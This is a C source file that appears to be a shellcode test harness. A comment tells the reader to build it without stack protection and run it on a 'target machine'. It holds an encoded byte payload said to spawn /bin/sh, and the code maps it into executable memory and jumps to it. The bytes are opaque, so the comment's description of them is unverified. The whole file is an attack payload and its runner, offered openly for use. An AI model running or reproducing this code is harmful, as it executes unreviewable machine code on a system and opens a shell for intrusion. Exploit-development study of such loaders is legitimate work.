/*
Compile and run on the target machine:
    gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
    ./shellcode
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>

unsigned char shellcode[] =
"\xbb\x51\x0c\xd2\x32\xda\xd2\xd9\x74\x24\xf4\x5d\x2b\xc9"
"\xb1\x12\x83\xed\xfc\x31\x5d\x0e\x03\x0c\x02\x30\xc7\x9f"
"\xc1\x43\xcb\x8c\xb6\xf8\x66\x30\xb0\x1e\xc6\x52\x0f\x60"
"\xb4\xc3\x3f\x5e\x76\x73\x76\xd8\x71\x1b\x83\x10\x92\xcb"
"\xfb\x26\x92\xeb\xab\xaf\x73\x5b\x2d\xe0\x22\xc8\x01\x03"
"\x4c\x0f\xa8\x84\x1c\xa7\x5d\xaa\xd3\x5f\xca\x9b\x3c\xfd"
"\x63\x6d\xa1\x53\x27\xe4\xc7\xe3\xcc\x3b\x87";     // execve("/bin/sh")

int main() {
	void *exec_map = mmap(NULL, 0x1000, 7, MAP_PRIVATE | MAP_ANONYMOUS , -1, 0);
	printf("mmap : %p\n", exec_map);
	memcpy(exec_map, shellcode, strlen(shellcode));
	
    int (*ret)() = (int(*)())exec_map;
    ret();
}
